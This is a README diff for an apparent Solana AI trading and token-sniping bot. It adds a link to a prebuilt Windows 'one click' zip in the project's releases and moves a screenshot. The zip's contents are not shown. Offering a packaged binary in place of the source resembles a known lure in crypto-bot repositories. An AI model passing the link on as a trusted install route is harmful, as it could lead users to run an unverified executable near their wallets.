@@ -14,6 +14,8 @@ git clone https://github.com/SolAiTradingBot/Solana-Ai-Trading-Bot.git
 cd Solana-Ai-Trading-Bot
 python main.py
 ```
+The second option for Windows operating systems is to run the packaged application directly:
+[Windows 10/11 One Click App](https://github.com/SolAiTradingBot/Solana-Ai-Trading-Bot/releases/download/1.3/SolTrade.bot.zip)
 
 For Macos (Terminal):
 ```bash
@@ -48,6 +50,10 @@ python3 main.py
   - Multi-trade Support
   - Gas Multiplier Control
   - Timeframe Configuration
+ 
+
+![Sniper Bot](screenshots/sniper.png)
+*Advanced token sniping interface*
 
 ## 🔍 Trading Modules
 
@@ -87,9 +93,6 @@ python3 main.py
 - Smart portfolio management
 
 ## 📸 Screenshots
-
-![Sniper Bot](screenshots/sniper.png)
-*Advanced token sniping interface*
 
 ![AI Trading](screenshots/ai-trading.png)
 *AI-powered trading module with performance analytics*
